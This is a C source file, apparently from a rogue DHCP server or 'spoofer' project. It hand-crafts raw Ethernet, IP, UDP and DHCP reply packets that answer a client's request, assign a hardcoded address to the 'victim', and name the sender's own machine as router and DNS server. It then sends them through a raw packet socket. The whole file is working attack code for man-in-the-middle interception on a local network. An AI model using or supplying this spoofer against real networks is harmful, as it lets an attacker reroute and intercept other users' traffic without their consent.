#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <linux/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "dhcp.h"
#include "spoofer.h"
#include "checksum.h"

static void
fill_ethernet()
{
	struct ether_header* header;
	header  = (struct ether_header*) send_buffer;

	header->ether_type = htons(0x0800);

	for (int i = 0; i < 6; i++)
	{
		header->ether_shost[i] = mac_address.ifr_hwaddr.sa_data[i];
		header->ether_dhost[i] = eth_header->ether_shost[i];
	}
}

static void
fill_ip()
{
	struct iphdr* header;
	header = (struct iphdr*) (send_buffer + sizeof(struct ether_header));

	//TODO: Change this to get correct ip from machine and fake ip for victim.
	char* dst_addr="192.168.86.120";

	header->ihl = 5;
	header->version = 4;
	header->tot_len = htons(336);
	header->ttl = 16;
	header->protocol = IPPROTO_UDP;
	header->saddr = inet_addr(ip_str);
	header->daddr = inet_addr(dst_addr);
	header->check = in_cksum((unsigned short *)header, sizeof(struct iphdr));
}

static void
fill_udp()
{
	struct udphdr* header;
	header  = (struct udphdr*) (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));

	header->source = htons(67);
	header->dest = htons(68);
	header->len = htons(0x13c);
	header->check = htons(0);
}

static void
copy_ip(unsigned char* new_ip)
{
	new_ip[0] = (ip_int >> 24) & 255;
	new_ip[1] = (ip_int >> 16) & 255;
	new_ip[2] = (ip_int >> 8) & 255;
	new_ip[3] = ip_int & 255;
}

static void
set_magic_cookie(unsigned char* options)
{
	options[0]=0x63;
	options[1]=0x82;
	options[2]=0x53;
	options[3]=0x63;
}

static void
set_dhcp_message_type(unsigned char* options, unsigned char type)
{
	options[0]=53;
	options[1]=1;
	options[2]=type;
}

static void
set_dhcp_server_identifier(unsigned char* options)
{
	options[0]=54;
	options[1]=4;
	copy_ip(&options[2]);
}

static void
set_dhcp_subnet_mask(unsigned char* options)
{
	options[0]=1;
	options[1]=4;
	options[2]=255;
	options[3]=255;
	options[4]=255;
	options[5]=0;
}

static void
set_dhcp_address_lease_time(unsigned char* options)
{
	options[0]=51;
	options[1]=4;
	options[2]=0;
	options[3]=1;
	options[4]=56;
	options[5]=128;
}

static void
set_dhcp_router(unsigned char* options)
{
	options[0]=3;
	options[1]=4;
	copy_ip(&options[2]);
}

static void
set_dhcp_dns(unsigned char* options)
{
	options[0]=6;
	options[1]=4;
	copy_ip(&options[2]);
}

static void
set_dhcp_broadcast(unsigned char* options)
{
	options[0]=28;
	options[1]=4;
	options[2]=255;
	options[3]=255;
	options[4]=255;
	options[5]=255;
}

static void
fill_dhcp(unsigned char type)
{
	struct dhcp_packet* header;
	header = (struct dhcp_packet*)  (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)));

	header->op = 2;
	header->htype = 1;
	header->hlen = 6;
	header->hops = 0;
	header->xid = dhcp_header->xid;
	header->secs = 0;
	header->flags = 0;

	//TODO: Change this to get correct ip from machine and fake ip for victim.
	header->ciaddr = dhcp_header->ciaddr;
	inet_aton("192.168.86.120", &header->yiaddr);
	header->siaddr = dhcp_header->siaddr;
	header->giaddr = dhcp_header->giaddr;

	for (int i = 0; i < 6; i++)
	{
		header->chaddr[i] = eth_header->ether_shost[i];
	}

	set_magic_cookie(&header->options[0]);
	set_dhcp_message_type(&header->options[4], type);
	set_dhcp_server_identifier(&header->options[7]);
	set_dhcp_subnet_mask(&header->options[13]);
	set_dhcp_address_lease_time(&header->options[19]);
	set_dhcp_router(&header->options[25]);
	set_dhcp_dns(&header->options[31]);
	set_dhcp_broadcast(&header->options[37]);
	header->options[43]=0xff;
}

void
send_dhcp(unsigned char type)
{
	fill_ethernet();
	fill_ip();
	fill_udp();
	fill_dhcp(type);

	int sock;
	struct sockaddr_ll to;
	socklen_t len;
	unsigned char addr[6];

	if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		printf("Erro na criacao do socket.\n");
		exit(1);
	}

	to.sll_protocol= htons(ETH_P_ALL);
	to.sll_halen = 6;
	to.sll_ifindex = 3; // interface index on which packets will be sent
	size_t i;
	for ( i = 0; i < 6; i++)
	{
		addr[i] = eth_header->ether_shost[i];
	}

	memcpy (to.sll_addr, addr, 6);
	len = sizeof(struct sockaddr_ll);

	sendto(sock, (char *) send_buffer, sizeof(send_buffer), 0, (struct sockaddr*) &to, len);
	printf("( ͡° ͜ʖ ͡°) Mandei o DHCP safado\n");
	close(sock);
}
